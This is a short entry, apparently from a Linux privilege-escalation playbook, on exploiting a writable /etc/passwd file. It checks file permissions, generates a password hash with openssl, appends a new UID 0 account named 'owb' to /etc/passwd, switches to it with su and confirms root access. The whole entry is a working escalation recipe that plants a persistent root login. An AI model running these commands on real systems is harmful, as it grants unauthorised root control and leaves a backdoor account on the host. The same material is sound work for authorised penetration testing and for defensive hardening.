# LPRIV-19. Writable `/etc/passwd`

**Run this when:** `/etc/passwd` is writable by the current user.

```bash
ls -l /etc/passwd
command -v openssl
```

**Look for:** a writable passwd file. Append a UID 0 account with a known hash, then switch to it. `/etc/shadow` is not touched.

**If found:** generate a hash and append one line:

```bash
openssl passwd -6 '<PASSWORD>'
printf 'owb:<HASH>:0:0:root:/root:/bin/bash\n' >> /etc/passwd
su owb
id
```

Remove the line afterwards if the file must stay clean. A duplicate UID 0 account is a real login, not a modified existing user.
